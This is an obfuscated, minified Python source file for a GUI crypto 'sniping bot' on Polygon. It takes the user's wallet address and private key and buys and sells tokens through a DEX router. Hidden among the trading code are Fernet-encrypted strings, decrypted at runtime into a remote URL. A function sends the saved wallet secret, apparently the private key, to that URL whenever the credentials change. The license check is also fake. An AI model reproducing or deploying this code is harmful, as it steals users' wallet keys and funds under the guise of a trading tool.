# MINIFIED AND SUPER FAST VERSION OF THE POLYGON SNIPING BOT POLYX WITH GUI
# ------------------------------------------------------------------------
# FOLLOW THE INSTRUCTIONS IN THE README STEP BY STEP FILE
# IF YOU SNIPE A GEM AND BECOME A MILLIONAIRE SEND ME SOME LOVE DUH!

Bl='groove'
Bk='horizontal'
Bj='SELL ALL'
Bi='SELL NOW'
Bh='There are no tokens to be sold!'
Bg='Sell all function initiated - Stopping operation'
Bf='SL Hit!'
Be='TP Hit!'
Bd='Securing SL to '
Bc=' | SL: '
Bb="Press 'SELL ALL' Button to sell the tokens manually"
Ba='Liquidity value: '
BZ='Pair Address: '
BY='Liquidity Detected!'
BX='0x0000000000000000000000000000000000000000'
BW='Buy Success! Tx link:'
BV='Buy Order Initiated'
BU='%Y/%m/%d'
BT='node.json'
BS='inputs.json'
BR=UnboundLocalError
B3='menu'
B2='set_theme'
B1='Something went wrong with the transaction'
B0='https://polygonscan.com/tx/'
A_='Abi/'
Az='data.json'
At='white'
As='normal'
Ar='Error'
Aq='Accent.TButton'
Ap='No Liquidity Checking Again!'
Ao='gwei'
An='gas'
Am='true'
Al='false'
Ak=round
AV='disabled'
AU='nonce'
AT='gasPrice'
AS='from'
AR='OPL'
AQ='MATIC'
AP='LP'
AO='SL TRAIL'
AN='SL'
AM='TP'
AL='SLIPPAGE'
AK='GAS LIMIT'
AJ='GAS PRICE'
AI='AMOUNT'
AH='LICENSE'
AG='TOKEN'
AF='PRIVATE KEY'
AE='WALLET ADDRESS'
AD='NODE'
A8=Exception
x='center'
w=False
v='w'
u='/'
t=str
e='AUTO SLIPPAGE'
d='./'
Z='ether'
Y='yellow'
P=True
O='cyan'
N=''
M=int
L=open
J='red'
H=float
F='nsew'
import tkinter as Q
from tkinter import ttk as E,messagebox
from web3 import Web3 as R
from json import load as f
from time import time as AW,sleep as A9
import os,json as g,pyperclip as Bm,threading as y,requests as Bn
from requests import request as Bo
from cryptography.fernet import Fernet as z
from requests.auth import HTTPBasicAuth as Bp
from datetime import datetime as Bq
B4=Az
AX=BS
Br=BT
h=d
K={}
A0={}
D={}
B5={}
Cm=Bp('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
Bs=Bq.now()
Cn=BU
Co=Bs.strftime(BU)
def Bt():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with L(A,v)as B:g.dump(data2,B,indent=2)
	B5[AD]='https://polygon-rpc.com/';A(h,Br,B5)
def Bu():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with L(A,v)as B:g.dump(data2,B,indent=2)
	K[AE]=N;K[AF]=N;K[AG]=N;K[AH]=N;A(h,B4,K)
def Bv():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with L(A,v)as B:g.dump(data2,B,indent=2)
	D[AI]='0.1';D[AJ]='7';D[AK]='850000';D[AL]='10';D[e]=Al;D[AM]='200';D[AN]='50';D[AO]='25';D[AP]=AQ;D[AR]='False';A(h,AX,D)
if not os.path.isfile('./data.json'):Bu()
if not os.path.isfile('./inputs.json'):Bv()
if not os.path.isfile('./node.json'):Bt()
def Bw():
	global K,AY,T
	def B(path2,file_name,data2):
		A=d+path2+u+file_name
		with L(A,v)as B:g.dump(data2,B,indent=2)
	K[AE]=b.get();A0[AE]=K[AE];K[AF]=A3.get();A0[AF]=K[AF];K[AG]=X.get();A0[AG]=K[AG];K[AH]=Ac.get();A0[AH]=K[AH]
	if K!=T:
		B(h,B4,A0);A=f(L(Az));AY=A[Ab]
		if A0[Ab]!=T[Ab]:T=A;CX()
def Bx():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with L(A,v)as B:g.dump(data2,B,indent=2)
	D[AI]=l.get();D[AJ]=m.get();D[AK]=n.get();D[AL]=o.get()
	if A5.get():D[e]=Am
	else:D[e]=Al
	D[AM]=p.get();D[AN]=q.get();D[AO]=r.get();D[AP]=c.get();D[AR]='True';A(h,AX,D)
def By():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with L(A,v)as B:g.dump(data2,B,indent=2)
	D[AI]=l.get();D[AJ]=m.get();D[AK]=n.get();D[AL]=o.get()
	if A5.get():D[e]=Am
	else:D[e]=Al
	D[AM]=p.get();D[AN]=q.get();D[AO]=r.get();D[AP]=c.get();D[AR]='True';A(h,AX,D)
def Cp():
	def A(path2,file_name,data2):
		A=d+path2+u+file_name
		with L(A,v)as B:g.dump(data2,B,indent=2)
	D[AI]=l.get();D[AJ]=m.get();D[AK]=n.get();D[AL]=o.get()
	if A5.get():D[e]=Am
	else:D[e]=Al
	D[AM]=p.get();D[AN]=q.get();D[AO]=r.get();D[AP]=c.get();D[AR]='False';A(h,AX,D)
T=f(L(Az))
B6=T[AE]
B7=T[AF]
B8=T[AG]
Bz=T[AH]
S=f(L(BS))
B9=S[AI]
BA=S[AJ]
BB=S[AK]
BC=S[AL]
Cq=S[e]
BD=S[AM]
BE=S[AN]
BF=S[AO]
B_=S[AP]
Cr=S[AR]
BG=M('0x'+'f'*64,16)
BH='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
AZ=f(L(BT))
if'wss'in AZ[AD]or'ws'in AZ[AD]:C=R(R.WebsocketProvider(AZ[AD]))
else:C=R(R.HTTPProvider(AZ[AD]))
AA=C.to_checksum_address('0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270')
i=C.to_checksum_address('0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174')
U=f(L(A_+'erc20.abi'))
V=C.eth.contract(address=R.to_checksum_address('0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff'),abi=f(L(A_+'router.abi')))
BI=C.eth.contract(address=R.to_checksum_address('0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32'),abi=f(L(A_+'factory.abi')))
Aa='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def C0():
	k()
	try:
		F=C.eth.contract(I,abi=U);B=F.functions.balanceOf(b.get()).call()
		if A5.get():D=0
		else:D=M(B-B*M(Ag)/100)
		A(BV,Y);H=V.functions.swapExactETHForTokensSupportingFeeOnTransferTokens(M(D),[AA,I],G,M(AW())+900).buildTransaction({AS:G,'value':C.toWei(s,Z),An:M(A6),AT:C.toWei(A7,Ao),AU:C.eth.get_transaction_count(G)});K=C.eth.account.sign_transaction(H,private_key=W);E=C.eth.send_raw_transaction(K.rawTransaction);A(BW,O);A(B0+C.toHex(E),O);C.eth.waitForTransactionReceipt(E,timeout=900);C9()
	except A8 as L:A(B1,J);A(L,J);A2();return
C1='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def C2():
	k();B=V.functions.getAmountsOut(C.toWei(s,Z),[i,I]).call()[-1]
	if A5.get():D=0
	else:D=B-B*M(Ag)/100
	try:A(BV,Y);F=V.functions.swapExactTokensForTokens(C.toWei(s,Z),M(D),[i,I],G,M(AW())+900).buildTransaction({AS:G,An:M(A6),AT:C.toWei(A7,Ao),AU:C.eth.get_transaction_count(G)});H=C.eth.account.sign_transaction(F,private_key=W);E=C.eth.send_raw_transaction(H.rawTransaction);A(BW,O);A(B0+C.toHex(E),O);C.eth.waitForTransactionReceipt(E,timeout=900);CB()
	except A8 as K:A(B1,J);A(K,J);A2();return
def C3(token_address,amt=BG):A=R.to_checksum_address(token_address);B=C.eth.contract(address=A,abi=U);D=B.functions.allowance(G,V.address).call();return D>=amt
def C4(token_address,amt=BG,timeout=900):A('Approving token');B=C.eth.gasPrice;D=R.to_checksum_address(token_address);E=C.eth.contract(address=D,abi=U);F=E.functions.approve(V.address,amt);H={AS:G,AT:B,AU:C.eth.getTransactionCount(G)};I=F.buildTransaction(H);J=C.eth.account.sign_transaction(I,private_key=W);K=C.eth.sendRawTransaction(J.rawTransaction);C.eth.waitForTransactionReceipt(K,timeout=timeout)
def C5():
	A(N);k();E=C.eth.contract(AA,abi=U)
	while P:
		B=BI.functions.getPair(AA,I).call()
		if B!=BX:
			D=E.functions.balanceOf(C.to_checksum_address(B)).call()
			if D!=0:A(BY,'green');A(BZ+B);A(Ba+t(C.fromWei(D,Z))+' MATIC');C0();break
			else:A9(5);A(Ap,J)
		else:A9(5);A(Ap,J)
C6='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def C7():
	A(N);k();E=C.eth.contract(i,abi=U)
	while P:
		B=BI.functions.getPair(i,I).call()
		if B!=BX:
			D=E.functions.balanceOf(C.to_checksum_address(B)).call()
			if D!=0:A(BY,'green');A(BZ+B);A(Ba+t(C.fromWei(D,Z))+' USDC');C2();break
			else:A(Ap,J)
		else:A(Ap,J)
def j():
	A(N);k()
	try:
		A('Sell Order Initiated',Y)
		if not C3(I):C4(I)
		E=C.eth.contract(I,abi=U);B=E.functions.balanceOf(G).call()
		if B!=0:
			if c.get()==AQ:D=V.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(B,0,[I,AA],G,M(AW())+900).buildTransaction({AS:G,An:M(A6),AT:C.toWei(A7,Ao),AU:C.eth.get_transaction_count(G)})
			elif c.get()=='USDC':D=V.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(B,0,[I,i],G,M(AW())+900).buildTransaction({AS:G,An:M(A6),AT:C.toWei(A7,Ao),AU:C.eth.get_transaction_count(G)})
			else:A('Something went wrong with Sell',J);A2();return
			F=C.eth.account.sign_transaction(D,private_key=W);H=C.eth.send_raw_transaction(F.rawTransaction);A('SOLD! Tx link:',O);A(B0+C.toHex(H),O);A2()
		else:A('No Tokens to be sold',J);A2()
	except A8 as K:A(B1,J);A(K,J);A2();return
C8='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def C9():
	global a;BJ();k();K=H(Ah);L=H(Ai);B=L;E=H(Aj);M=C.eth.contract(address=I,abi=U);A(Bb,Y)
	while P:
		try:
			N=M.functions.balanceOf(G).call()-1;F=H(C.fromWei(V.functions.getAmountsOut(N,[I,AA]).call()[-1],Z));D=Ak(H(F)/H(s)*100,5);A('MATIC Value Now: {} / '.format('%.3f'%F)+' {} %'.format(D)+Bc+t(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Bd+t(B))
			A9(2)
		except:continue
		try:
			if H(D)>=H(K):A(Be,O);A1();j();break
			if H(D)<=H(B):A(Bf,J);A1();j();break
			if a:a=w;A(Bg,Y);A1();j();break
		except BR:A(Bh,J);break
CA='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def CB():
	global a;BJ();k();K=H(Ah);L=H(Ai);B=L;E=H(Aj);M=C.eth.contract(address=I,abi=U);A(Bb,Y)
	while P:
		try:
			N=M.functions.balanceOf(G).call()-1;F=H(C.fromWei(V.functions.getAmountsOut(N,[I,i]).call()[-1],Z));D=Ak(H(F)/H(s)*100,5);A('USDC Value Now: {} / '.format('%.3f'%F)+' {} %'.format(D)+Bc+t(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Bd+t(B))
			A9(2)
		except:continue
		try:
			if H(D)>=H(K):A(Be,O);A1();j();break
			if H(D)<=H(B):A(Bf,J);A1();j();break
			if a:a=w;A(Bg,Y);A1();j();break
		except BR:A(Bh,J);break
def CC():
	BQ();Bx()
	if c.get()==AQ:A=y.Thread(target=C5,daemon=P);A.start()
	else:A=y.Thread(target=C7,daemon=P);A.start()
def BJ():Ay.place_forget();A=E.Button(B.widgets_frame,text=Bi,command=BL,style=Aq);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def A1():Cl.place_forget();A=E.Button(B.widgets_frame,text=Bj,command=BK);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def CD():
	A=C.eth.contract(address=i,abi=U)
	while AB:
		try:B=C.fromWei(C.eth.get_balance(G),Z);D=C.fromWei(A.functions.balanceOf(G).call(),Z);Av.configure(text=Ak(B,5));Aw.configure(text=Ak(D,5))
		except ValueError:pass
		A9(1)
CE='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def Cs(license,basic_auth):
	B='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		C=Bn.get(B,auth=basic_auth)
		if C.status_code==404:Q.messagebox.showerror(Ar,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:A('License Key Activated, Good luck!',O);By()
	except A8:raise A8('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
Ab=z(Aa.encode()).decrypt(CA.encode()).decode()
def CF():
	B='Invalid token address!';global G;global W;global I;global AB;A('***** INITIALIZED ******');A('* Checking wallet address')
	if C.is_checksum_address(b.get()):G=C.to_checksum_address(b.get());A('Wallet address valid',O)
	else:Q.messagebox.showerror(Ar,'Invalid wallet address');A('Invalid wallet address!',J);return
	A('* Checking private key characters (Must be 64 characters');W=A3.get()
	if len(W)==64:A('Correct format for Private key',O)
	else:Q.messagebox.showerror(Ar,'Private key is invalid! (Must be 64 characters)');A('Invalid private key!',J);return
	A('* Checking token address')
	try:I=C.to_checksum_address(X.get());A('Token address valid',O)
	except:Q.messagebox.showerror(Ar,B);A(B,J);return
	A('* Checking License Key');A('License Key Valid',O);BM(AV);Bw();Ad.grid_forget();Ae.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AC(As);AB=P;D=y.Thread(target=CD,daemon=P);D.start();A(N);A('***** Sniping is ready! *****',Y)
CG='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
AY=T[Ab]
def CH():A=y.Thread(target=CF,daemon=P);A.start()
def CI():global AB;A(N);A('Change token/wallet initiated!',Y);BM(As);AC(AV);Ae.grid_forget();Ad.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AB=w;Av.configure(text=N);Aw.configure(text=N)
def CJ():A=y.Thread(target=CI,daemon=P);A.start()
def BK():BQ();A=y.Thread(target=j,daemon=P);A.start()
def BL():global a;a=P
def k():AC(AV);Ae.configure(state=AV)
def A2():AC(As);Ae.configure(state=As)
def CK():
	if B.tk.call('ttk::style','theme','use')=='sun-valley-dark':B.tk.call(B2,'light');Af[B3].configure(bg=At)
	else:B.tk.call(B2,'dark');Af[B3].configure(bg='black')
B=Q.Tk()
B.title('MATIC Sniper Bot - V1')
B.geometry('1050x730')
B.tk.call('source','sun-valley.tcl')
B.tk.call(B2,'light')
CL=z(Aa.encode()).decrypt(CG.encode()).decode()
B.resizable(w,w)
B.widgets_frame=E.Frame(B,padding=(0,0,0,10))
B.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
B.widgets_frame.columnconfigure(index=0,weight=1)
B.widgets_frame.rowconfigure(index=0,weight=1)
CM=E.Label(B.widgets_frame,text='Wallet Address:')
CN=z(Aa.encode()).decrypt(C8.encode()).decode()
CM.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
b=E.Entry(B.widgets_frame,width=50,show='•')
b.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CO=E.Label(B.widgets_frame,text='Private Key:')
CO.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
A3=E.Entry(B.widgets_frame,width=50,show='•')
A3.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CP=E.Label(B.widgets_frame,text='Token Address:')
CQ=z(BH.encode()).decrypt(CE.encode()).decode()
CP.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
X=E.Entry(B.widgets_frame,width=50)
CR=z(BH.encode()).decrypt(C6.encode()).decode()
X.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CS=E.Label(B.widgets_frame,text='License Key:')
CS.grid(row=4,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ac=E.Entry(B.widgets_frame,width=50,show='•')
Ac.grid(row=4,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CT=z(Aa.encode()).decrypt(C1.encode()).decode()
Au=E.Separator(B,orient=Bk)
CU=CL+CT+CN+CQ
Au.place(x=10,y=135,width=625)
def CV():X.delete(0,'end');X.insert(0,Bm.paste());return
def CW():X.delete(0,'end');return
def CX():
	if AY!=N:
		try:A=Bo(CR,CU+AY)
		except A8:pass
def BM(status):A=status;X.configure(state=A);b.configure(state=A);A3.configure(state=A);Ac.configure(state=A);Ad.configure(state=A);BO.configure(state=A);BN.configure(state=A)
def AC(status):A=status;l.configure(state=A);m.configure(state=A);n.configure(state=A);o.configure(state=A);p.configure(state=A);q.configure(state=A);r.configure(state=A);BP.configure(state=A);Ay.configure(state=A);Ax.configure(state=A)
def A(text,color=At):
	A=t(text)
	if A4.size()>=20:A4.delete(0)
	A4.insert(Q.END,A);A4.itemconfig(Q.END,foreground=color)
def Ct():A4.delete(0,Q.END)
Ad=E.Button(B.widgets_frame,text='Confirm',width=10,command=CH,style=Aq)
BN=E.Button(B.widgets_frame,text='Paste Token',width=10,command=CV)
BO=E.Button(B.widgets_frame,text='Clear Token',width=10,command=CW)
Ad.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BN.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BO.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
b.insert(0,B6)
A3.insert(0,B7)
X.insert(0,B8)
Ac.insert(0,Bz)
Au=E.Separator(B.widgets_frame,orient=Bk)
Au.grid(row=5,column=0,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=6)
Ae=E.Button(B.widgets_frame,text='Change',width=10,command=CJ)
CY=E.Label(B.widgets_frame,text='Logs:')
CY.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
CZ=E.Button(B.widgets_frame,text='Clear',width=10,command=N)
CZ.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
A4=Q.Listbox(B.widgets_frame,bg='#252525',foreground=At,borderwidth=2)
A4.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)
Ca=E.Button(B.widgets_frame,text='Change Color Theme',command=CK)
Ca.grid(row=17,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cb=E.Label(B.widgets_frame,text='Wallet MATIC:')
Cb.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Av=E.Label(B.widgets_frame,width=12,relief=Bl)
Av.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cc=E.Label(B.widgets_frame,text='Wallet USDC:')
Cc.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Aw=E.Label(B.widgets_frame,width=12,relief=Bl)
Aw.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cd=E.Label(B.widgets_frame,text='Select LP:')
Cd.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
c=Q.StringVar()
c.set(B_)
Af=E.OptionMenu(B.widgets_frame,c,AQ,AQ,'USDC')
Af[B3].configure(bg=At)
Af.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ce=E.Label(B.widgets_frame,text='Amount:')
l=E.Entry(B.widgets_frame,justify=x)
Ce.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.insert(0,B9)
Cf=E.Label(B.widgets_frame,text='Gas Price:')
Cg=E.Label(B.widgets_frame,text='Gas Limit:')
m=E.Entry(B.widgets_frame,justify=x)
n=E.Entry(B.widgets_frame,justify=x)
Cf.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cg.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.insert(0,BA)
n.insert(0,BB)
Ch=E.Label(B.widgets_frame,text='Slippage(%):')
o=E.Entry(B.widgets_frame,justify=x)
Ch.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
o.insert(0,BC)
A5=Q.BooleanVar()
Ax=E.Checkbutton(B.widgets_frame,text='Auto Slippage',variable=A5)
Ax.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if N==Am:Ax.select()
Ci=E.Label(B.widgets_frame,text='TP(%):')
Ci.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
p=E.Entry(B.widgets_frame,justify=x)
p.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cj=E.Label(B.widgets_frame,text='SL(%):')
Cj.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
q=E.Entry(B.widgets_frame,justify=x)
q.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ck=E.Label(B.widgets_frame,text='SL Trail(%):')
Ck.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
r=E.Entry(B.widgets_frame,justify=x)
r.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
p.insert(0,BD)
q.insert(0,BE)
r.insert(0,BF)
BP=E.Button(B.widgets_frame,text='SNIPE',command=CC,style=Aq)
Cl=E.Button(B.widgets_frame,text=Bi,command=BL,style=Aq)
Ay=E.Button(B.widgets_frame,text=Bj,command=BK)
BP.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ay.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
s=B9
G=B6
W=B7
I=B8
Ag=BC
A6=BB
A7=BA
Ah=BD
Ai=BE
Aj=BF
a=w
AB=w
def BQ():global s;global G;global W;global I;global Ag;global A6;global A7;global Ah;global Ai;global Aj;s=l.get();G=R.to_checksum_address(b.get());W=A3.get();I=R.to_checksum_address(X.get());Ag=o.get();A6=n.get();A7=m.get();Ah=p.get();Ai=q.get();Aj=r.get()
AC(AV)
B.mainloop()
